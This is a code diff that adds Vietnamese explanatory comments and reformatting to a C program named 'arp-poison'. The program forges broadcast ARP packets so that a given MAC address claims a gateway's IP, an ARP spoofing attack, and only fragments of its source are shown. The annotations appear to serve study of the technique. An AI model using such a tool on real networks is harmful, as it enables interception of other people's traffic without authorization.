@@ -12,12 +12,17 @@
 #include <netinet/if_ether.h>
 #include <signal.h>
 
+//  Độ dài của địa chỉ IPv4: 4bytes = 32bits
 #define IP4LEN 4
+
+//  Độ của 1 gói tin ARP bao gồm kích thước của header Ethernet và header ARP
 #define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)
 
+//  gửi các gói tin
 int sock;
-void
-usage()
+
+
+void usage()
 {
   puts("usage:\t./arp-poison <interface> <gateway ip> <mac addr>");
   puts("ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff");
@@ -31,8 +36,7 @@ cleanup()
   exit(0);
 }
 
-int
-main(int argc, char ** argv)
+int main(int argc, char ** argv)
 {
   char packet[PKTLEN];
   struct ether_header * eth = (struct ether_header *) packet;
@@ -43,12 +47,15 @@ main(int argc, char ** argv)
     usage();
   }
 
+  //  tạo socket raw với AF_PACKET để làm vc trực tiếp vs các gói tin ARP
   sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
   if (sock < 0)
     perror("socket"), exit(1);
 
+  // ĐẢM BẢO SOCKET ĐƯỢC ĐÓNG KHI NHẬP CTR+C
   signal(SIGINT, cleanup);
 
+  //  phân tích địa chỉ MAC và IP từ tham số dòng lện
   sscanf(argv[3], "%x:%x:%x:%x:%x:%x",  (unsigned int *) &arp->arp_sha[0],
 					(unsigned int *) &arp->arp_sha[1],
 					(unsigned int *) &arp->arp_sha[2],
@@ -61,6 +68,7 @@ main(int argc, char ** argv)
                                  (int *) &arp->arp_spa[2],
                                  (int *) &arp->arp_spa[3]);
 
+  // thiết lập gói tin ARP
   memset(eth->ether_dhost, 0xff, ETH_ALEN);//bcast
   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
   eth->ether_type = htons(ETH_P_ARP);
